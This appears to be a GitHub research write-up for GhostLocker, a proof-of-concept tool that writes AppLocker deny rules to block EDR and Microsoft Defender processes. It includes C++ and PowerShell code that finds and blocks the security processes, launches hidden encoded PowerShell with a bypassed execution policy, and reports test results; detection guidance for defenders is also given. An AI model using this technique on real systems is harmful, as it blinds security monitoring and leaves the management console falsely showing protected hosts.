# GhostLocker: AppLocker-Based EDR Neutralization

## Introduction

After my article on **Fairy-Law**, where I used kernel mitigations to disable Endpoint Detection & Response (EDR) solutions, [diversenok](https://github.com/diversenok) pointed out that IFEO exclusions (Image File Execution Options) were too invasive for third-party applications. This led to a better approach: leveraging the inherent power administrators already possess through **AppLocker**.

The concept was inspired by [diversenok](https://github.com/diversenok), who highlighted that administrators can legitimately control any software on their systems. From that insight, I developed a technique using AppLocker as a native Windows control mechanism. This research explores the **technical implementation of AppLocker for EDR control**, comparing it with **WDAC** and presenting a practical proof-of-concept tool.

---

## AppLocker: Application Whitelisting Architecture

AppLocker was introduced with **Windows 7** and enhanced in **Windows 8.1, 10 (Enterprise)** and **Windows Server 2012/R2/2016+**. It is an **application whitelisting framework** that allows administrators to define precisely which executables, scripts, or installers may execute for specific users or groups.

### Internal Architecture (Windows Internals Perspective)

#### User-Mode & Kernel Components:

**AppIDSvc (Application Identity Service)**
- Runs under `LocalService` account
- Monitors registry changes to AppLocker policy paths
- Translates XML-based rule definitions into binary SDDL (Security Descriptor Definition Language)
- Communicates policy updates to kernel driver via DeviceIoControl

**AppID.sys (Kernel Driver)**
- Intercepts process creation events through callback mechanisms
- Performs rule evaluation using `SeSrpAccessCheck`
- Optionally monitors DLL loads (disabled by default for performance reasons)

> **Clarification:**  
> While `AppID.sys` performs rule evaluation in kernel mode, DLL enforcement is not autonomous.  
> The kernel driver does not actively monitor DLL loads by itself. Instead, user-mode components must explicitly query the driver via IOCTL to determine whether a DLL load is permitted.  
> As a result, AppLocker DLL rules effectively act as a client-side protection mechanism.


### Rule Types and Enforcement

AppLocker supports two primary rule categories:

**Allow Rules**: Explicitly permit defined applications to execute

**Deny Rules**: Explicitly block defined applications from executing
- Deny rules always take precedence over allow rules
- Can include exceptions for specific conditions
- Support user and group-level targeting

### Rule Criteria (AppID Attributes):

- **Path-based rules**: `C:\Program Files\Security\*.exe`
- **Hash-based rules**: SHA256 Authenticode hash validation
- **Publisher rules**: Digital signature, version, product name verification
- **File attribute rules**: Company name, product version, etc.

### Registry Storage Locations:

```
HKLM\Software\Policies\Microsoft\Windows\SrpV2     (XML policy storage, persistent)
HKLM\SYSTEM\CurrentControlSet\Control\Srp\Gp\Exe  (SDDL binary format, active enforcement)
HKLM\SYSTEM\CurrentControlSet\Control\AppID\CertStore (Certificate cache)
```

### Service & SYSTEM Process Enforcement (Often Overlooked)

By default, AppLocker does **not enforce rules on services or SYSTEM processes**.  
There is no graphical user interface option to enable this behavior.

Enforcement for services can only be enabled via the XML policy using `RuleCollectionExtensions`.

The following policy section is required to enforce AppLocker rules on services:


```
<RuleCollectionExtensions>
  <ThresholdExtensions>
    <Services EnforcementMode="Enabled"/>
  </ThresholdExtensions>
  <RedstoneExtensions>
    <SystemApps Allow="Enabled"/>
  </RedstoneExtensions>
</RuleCollectionExtensions>
```
As indicated by the extension names, these options are supported only on Windows 10+ and are not available on earlier versions.
See [Microsoft - AppLocker rule collection extensions](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/rule-collection-extensions)

### Enforcement Flow:

1. Windows notifies AppID driver on process creation
2. `AppID.sys` evaluates application attributes
3. Based on AppLocker rules, it allows or blocks the process
4. **If blocked, process creation is aborted with `STATUS_ACCESS_DISABLED_BY_POLICY_OTHER`**

### Critical Limitation:

⚠️ **AppLocker does NOT terminate running processes.**

AppLocker enforcement only applies to new process creation events. Already-running EDR processes continue executing until system reboot. This is a fundamental architectural constraint.

**Kernel Driver Telemetry Caveat:**

Even after blocking EDR userland executables, kernel drivers (`*.sys`) remain active and operational. These drivers continue:
- Registering kernel callbacks (process, thread, image load, registry)
- Collecting telemetry data
- Monitoring system events

However, extensive testing reveals that this telemetry becomes functionally ineffective. Without userland analysis engines, correlation systems, and reporting mechanisms, the raw telemetry data cannot be processed into actionable detections. EDR solutions rely heavily on userland components for:
- Event correlation and behavioral analysis
- Machine learning inference
- Alert generation and response orchestration
- Communication with management consoles

---

## GhostLocker: Proof-of-Concept Implementation

### Tool Overview

**GhostLocker** is a C++ implementation that automates AppLocker policy deployment to block EDR executables. 

### Technical Implementation Analysis
#### Implementation Variants

GhostLocker provides two implementation variants:

#### `main.cpp` – Dynamic Enumeration Version
This version enumerates running processes and resolves their full image paths using native APIs (`NtQuerySystemInformation`).  
The resolved absolute paths are then used to generate precise AppLocker deny rules.

The tool uses `CreateToolhelp32Snapshot` with `TH32CS_SNAPPROCESS` to enumerate all running processes. It compares process names against a predefined target list using case-insensitive matching (`_wcsicmp`).

**Why this approach?**
- Lightweight and fast enumeration
- No elevated privileges required for reading process list
- Case-insensitive matching handles naming variations

#### 1. Process Enumeration (`FindTargetsAndQueryPaths`)

```cpp
const wchar_t* targetNames[] = {
    L"MpDefenderCoreService.exe",
    L"MsMpEng.exe",
    L"WinDefend.exe",
    L"EDR_Component_Name.exe",
};
```

#### 2. Path Resolution via NtQuerySystemInformation

```cpp
SYSTEM_PROCESS_ID_INFORMATION spi = { 0 };
spi.ProcessId = PID;
spi.ImageName.MaximumLength = 1024;
spi.ImageName.Buffer = (PWSTR)allocBuffer;

status = NtQuerySystemInformation(
    SystemProcessIdInformation,
    &spi,
    sizeof(spi),
    0
);
```

**Technical Details:**
- Uses undocumented `SystemProcessIdInformation` (0x58) information class
- Returns NT device path format: `\Device\HarddiskVolume3\Windows\System32\...`
- Requires conversion to Win32 path format for AppLocker compatibility

**Path Conversion Logic:**
```cpp
std::wstring ForceHarddiskVolumeToC(const std::wstring& ntPath)
{
    const std::wstring prefix = L"\\Device\\HarddiskVolume3\\";
    if (ntPath.rfind(prefix, 0) == 0)
    {
        std::wstring rest = ntPath.substr(prefix.length());
        return L"C:\\" + rest;
    }
    return ntPath;
}
```

**Limitation:** Hardcoded `HarddiskVolume3` assumption. Should be improved to dynamically resolve volume numbers.

#### 3. PowerShell Policy Generation

The tool embeds a complete PowerShell script that:

**a) Validates Target Paths**
```powershell
foreach ($exe in $ExeToBlock) {
    if (!(Test-Path $exe)) {
        Write-Host '[!] ERROR: File does not exist:' $exe -ForegroundColor Red
        exit 1
    }
}
```

**b) Generates Dynamic Deny Rules**
```powershell
foreach ($exe in $ExeToBlock) {
    $id   = [guid]::NewGuid().ToString()
    $name = Split-Path $exe -Leaf
    
    $dynamicBlockRules += '<FilePathRule Id="' + $id + '" Name="Block ' + $name + 
                          '" Description="Blocked by policy" UserOrGroupSid="S-1-1-0" Action="Deny">'
    $dynamicBlockRules += '<Conditions><FilePathCondition Path="' + $exe + '" /></Conditions>'
    $dynamicBlockRules += '</FilePathRule>'
}
```

**Key Policy Elements:**
- `UserOrGroupSid="S-1-1-0"`: Applies to Everyone (all users)
- `Action="Deny"`: Explicit block rule
- `EnforcementMode="Enabled"`: Active enforcement for EXE rules
- Deny rules inserted before fallback allow rules (precedence)

**c) Policy Application**
```powershell
Set-AppLockerPolicy -XmlPolicy $tempPath -ErrorAction Stop
gpupdate /force | Out-Null
```

#### 4. Base64 Encoding and Execution

```cpp
void RunPowerShellInMemory()
{
    std::wstring script = BuildFullPowerShellScript();
    const BYTE* bytes = reinterpret_cast<const BYTE*>(script.c_str());
    size_t byteLen = script.size() * sizeof(wchar_t);
    
    std::wstring encoded = Base64Encode(bytes, byteLen);
    std::wstring params = L"-NoProfile -ExecutionPolicy Bypass -EncodedCommand ";
    params += encoded;
    
    ShellExecuteW(NULL, L"runas", L"powershell.exe", params.c_str(), NULL, SW_SHOW);
}
```

**Technical Reasoning:**
- **UTF-16LE encoding**: PowerShell `-EncodedCommand` expects UTF-16LE
- **Base64 encoding**: Bypasses command-line character restrictions
- **`-ExecutionPolicy Bypass`**: Ignores script execution policy
- **`runas` verb**: Triggers UAC elevation for administrative rights

#### `main_improved.cpp` – Static Wildcard-Based Version
After clarification from **diversenok**, it became clear that AppLocker path rules support wildcard matching and do not require full executable paths.

This improved version removes all process enumeration and native path resolution logic and instead relies on static wildcard rules such as: `*\MsMpEng.exe`

---

## Requirements

⚠️ **Prerequisites for Successful Deployment:**

- Must execute from elevated (Administrator) context
- AppIDSvc service must be running: `sc start AppIDSvc`
- System reboot required post-deployment for full effectiveness
- Target EDR processes must be running during enumeration phase

---

## Research Results: Real-World EDR Testing

### Testing Methodology

Extensive controlled testing was conducted against multiple commercial EDR solutions to evaluate effectiveness.

**Test Environment:**
- Windows 11 (25H2)
- Multiple commercial EDR products (names withheld)
- Baseline detection: simple process injection techniques
- Pre-test verification: confirmed EDR detection capabilities

### Key Findings

#### Detection Capabilities Post-Block

**Behavioral Analysis Failure:**
- All tested EDR solutions failed to generate alerts after AppLocker blocking
- Previously-detected simple injections went undetected
- No behavioral detections triggered for suspicious activities

**Management Console Perspective:**
- Agents continued reporting as "online" and "protected"
- Last-seen timestamps updated normally
- **No indication of compromise from management interface**

#### Kernel Driver Telemetry Analysis

Despite kernel drivers continuing to run and collect telemetry data streams, the absence of userland processing components rendered collected data ineffective.

**What Continues Working:**
- Kernel callbacks fire normally (process, thread, image load, registry, etc.)
- Raw telemetry data collection persists
- Driver-to-driver communication may function


**Critical Insight:**

Modern EDR architecture relies on a tight coupling between kernel drivers and userland analysis engines. 
Breaking this coupling effectively blinds the EDR despite continued telemetry collection.

**Screenshot (Enumerating and applying the AppLocker-Policy):**
<img width="3102" height="1237" alt="Screenshot 2025-12-09 153050" src="https://github.com/user-attachments/assets/c7d0cf80-5ecf-4e83-a80c-535f4be88d8c" />

**Screenshot (Deactivated WinDefend):**


<img width="785" height="562" alt="Screenshot 2025-12-10 092525" src="https://github.com/user-attachments/assets/962ba689-61a3-4a19-8802-4f60335b7c8b" />


<img width="1242" height="927" alt="Screenshot 2025-12-10 123246" src="https://github.com/user-attachments/assets/eb358319-9450-4a34-9c1a-0d37423e814c" />


**Screenshot of Version 2**
<img width="2192" height="517" alt="Screenshot 2025-12-19 152900" src="https://github.com/user-attachments/assets/90a92441-9a7b-415c-b246-95c4f3e3316e" />

---

## Comparison: WDAC vs. AppLocker

### What is WDAC?

Windows Defender Application Control (WDAC) was introduced in Windows 10 and represents Microsoft's modern application control framework. 
It enforces policies on both user-mode and kernel-mode binaries.

#### WDAC Architecture:

**Core Characteristics:**
- System-wide enforcement (all users, all sessions)
- Pre-boot enforcement
- Default-deny model
- Code Integrity (CI) policy engine
- Kernel driver signing enforcement

**WDAC Policy Storage:**
```
C:\Windows\System32\CodeIntegrity\SIPolicy.p7b    (Active policy, signed)
C:\Windows\System32\CodeIntegrity\CIPolicies\     (Multiple policies)
EFI System Partition (UEFI enforcement)
```

### WDAC as Attack Vector: Krueger

[Krueger](https://github.com/logangoins/Krueger) demonstrated WDAC abuse for EDR driver blocking:


**Key Difference:**
- WDAC blocks at **driver load time** (kernel)
- AppLocker blocks at **process creation time** (userland)

### Detailed Comparison Matrix

| Feature | AppLocker | WDAC |
|---------|-----------|------|
| **Enforcement Scope** | User-mode executables only | User-mode + kernel-mode drivers |
| **Enforcement Timing** | Process creation | Boot + runtime |
| **User Granularity** | Per-user/group rules | System-wide  |
| **Default Mode** | Allow-by-default | Deny-by-default |
| **Rule Types** | Path, Hash, Publisher | Hash, Publisher, WHQLFile, Version |
| **Blocks Drivers** | ❌ No | ✅ Yes |
| **Policy Complexity** | Moderate | High |
| **Audit Mode** | ✅ Yes | ✅ Yes |


### Practical Attack Considerations

**When to Use AppLocker (GhostLocker):**
- Goal is userland process blocking only
- Want to maintain kernel driver telemetry (less suspicious)
- Need user-scoped policies for targeted blocking

**When to Use WDAC (Krueger-style):**
- Need complete driver-level blocking
- Target has no WDAC enforcement

---
## Detection & Prevention Guidance

### 1. Pre-Execution Policy Evaluation

Windows provides the `Get-AppLockerFileInformation` API, which allows testing whether a specific executable would be blocked under the current AppLocker policy.

An EDR can use this mechanism to proactively verify whether its own binaries or services would be denied execution after a policy change.  
If a core component transitions from allowed to denied, this should be treated as a high-confidence tamper condition.

### 2. AppLocker Policy Change Monitoring

AppLocker policy updates are communicated to `AppID.sys` via explicit IOCTL calls from user mode.  
This provides a clear signal path indicating that enforcement state has changed.

Kernel drivers can observe these notifications and correlate them with subsequent execution failures of protected services, enabling accurate detection of policy-based neutralization.

### 3. Persistence and Reboot Correlation

AppLocker policies are persisted across reboots in well-defined registry locations.  
EDR solutions can snapshot relevant policy state before reboot and verify enforcement consistency after system startup.

A mismatch between expected execution state and post-reboot enforcement strongly indicates intentional policy manipulation.

### 4. Built-in Exclusion Mechanisms

Windows includes native mechanisms for excluding processes from SRP/AppLocker enforcement.  
Security products are expected to integrate with these mechanisms to ensure operational continuity.

Failure to account for these exclusions is not a limitation of AppLocker, but rather an architectural oversight in the protected product.

### Summary

None of these detection strategies require bypassing AppLocker or violating Windows security boundaries.  
They rely solely on documented behavior and interfaces already provided by the operating system.

---
## Conclusion

**GhostLocker** demonstrates that AppLocker, a legitimate Windows security feature, can be weaponized to neutralize EDR solutions through userland process blocking. 
This research highlights fundamental architectural vulnerabilities in current EDR designs that tightly couple kernel telemetry collection with userland analysis engines.

### Key Takeaways:

1. **AppLocker Effectiveness**: Successfully blocks EDR userland processes across multiple vendors
2. **Architectural Vulnerability**: Kernel drivers continue running but become functionally blind without userland processing
3. **Detection Blindness**: Tested EDRs showed complete detection failure post-blocking
4. **Management Console Deception**: Agents appear "online" and "protected" despite compromise
5. **System-Native Technique**: Uses legitimate Windows features

### For future a C# Implementation:

- Pure .NET in-memory execution (better OPSEC)
- Direct API usage without PowerShell dependencies

---


## Disclaimer

This research is provided for **educational and defensive security purposes only**. 
The techniques described should only be used in authorized testing environments with explicit permission. 

---

## References & Further Reading

- [Windows Internals, Part 1 & 2 (7th Edition)](https://www.microsoftpressstore.com/store/windows-internals-part-1-system-architecture-processes-9780735684188)
- [AppLocker Technical Reference](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview)
- [WDAC Design Guide](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control-design-guide)
- [Krueger: WDAC Abuse Tool](https://github.com/logangoins/Krueger)


---

## Community Contributions Welcome

If you are interested in contributing to **GhostLocker**, especially to the C# implementation, you are very welcome.

---
